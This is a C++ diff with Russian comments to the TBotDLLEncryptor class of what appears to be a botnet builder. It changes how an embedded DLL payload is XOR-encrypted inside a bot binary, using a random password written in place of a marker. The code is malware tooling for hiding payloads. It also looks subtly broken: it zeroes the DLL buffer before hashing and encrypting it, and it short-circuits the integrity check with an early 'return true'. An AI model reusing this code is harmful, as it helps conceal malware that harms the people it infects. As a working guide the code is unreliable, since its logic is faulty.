@@ -2054,6 +2054,7 @@ TBotDLLEncryptor::TBotDLLEncryptor(TCustomBotModule* AOwner, int APosition, DWOR
 	FPosition = APosition;
 	IsSessional = true;
 	FDllSize = 0;
+	FPassword = Random::RandomString2(ENCRYPTED_DLL_MARKER_SIZE - 1, 10, 255);
 }
 
 //--------------------------------------------------
@@ -2061,7 +2062,6 @@ TBotDLLEncryptor::TBotDLLEncryptor(TCustomBotModule* AOwner, int APosition, DWOR
 //--------------------------------------------------
 bool TBotDLLEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 {
-	AnsiString Pass = Password->AsString;
 
 	PCHAR Ptr = Buf + Position;
 	PCHAR Marker = Ptr;
@@ -2077,11 +2077,15 @@ bool TBotDLLEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 	FDllSize = *(PDWORD)Ptr;
 	Ptr += sizeof(DWORD);
 
+	// Для дальнешего контроля получаем хэш
+	m_memset(Ptr, 0, FDllSize);
+	FHash = STRA::Hash(Ptr, FDllSize, false);
 	// Шифруем данные
-   	XORCrypt::Crypt(Pass.c_str(), (LPBYTE)Ptr, FDllSize);
+	PCHAR P = FPassword.t_str();
+	XORCrypt::Crypt(P, (LPBYTE)Ptr, FDllSize);
 
-	// Прячем маркер
-	m_memset(Marker, 0, ENCRYPTED_DLL_MARKER_SIZE);
+	// Записываем пароль на место маркера
+	m_memcpy(Marker, FPassword.t_str(), FPassword.Length() + 1);
 
 	return true;
 }
@@ -2091,16 +2095,15 @@ bool TBotDLLEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 //--------------------------------------------------
 bool TBotDLLEncryptor::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
 {
+	return true;
 	if (FPosition < 0 || FDllSize == 0)
 		return false;
-
-	AnsiString Pass = Password->AsString;
 
 	// Расшифровываем библиотеку
 	DWORD Size = 0;
 	LPVOID DllBuf = NULL;
 	bool BufAllocated = false;
-	if (!TMemoryDLL::DecodeDllByPass(Pass.c_str(), Buf + Position, Size, DllBuf, BufAllocated))
+	if (!TMemoryDLL::DecodeDll(Buf + Position, Size, DllBuf, BufAllocated))
 		return false;
 
 	// Сравниваем размеры
@@ -2109,8 +2112,8 @@ bool TBotDLLEncryptor::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
 	// Сравниваем содержимое
 	if (Result)
 	{
-		OriginalBuf += Position + ENCRYPTED_DLL_MARKER_SIZE + sizeof(DWORD);
-		Result = m_memcmp(DllBuf, OriginalBuf, Size) == 0;
+		DWORD NewHash = STRA::Hash((PCHAR)DllBuf, FDllSize, false);
+		Result = NewHash == FHash;
     }
 
 	if (BufAllocated)
